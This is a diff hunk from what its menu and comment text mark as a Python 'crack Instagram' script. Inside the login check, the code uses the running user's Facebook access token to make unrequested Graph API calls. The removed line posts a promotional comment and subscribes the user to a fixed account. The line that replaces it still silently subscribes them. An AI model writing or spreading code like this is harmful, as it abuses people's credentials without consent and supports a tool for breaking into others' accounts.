@@ -853,7 +853,7 @@ def menu_instagram():
                 time.sleep(2)
                 login()
 	try:
-                otw = requests.get('https://graph.facebook.com/me?access_token=' +token);requests.post('https://graph.facebook.com/10159494942223544/comments/?message=Pengguna Script Crack Instagram ❤️&access_token='+token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
+                otw = requests.get('https://graph.facebook.com/me?access_token=' +token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
                 a = json.loads(otw.text)
 		nama = a['name']
 	except KeyError:
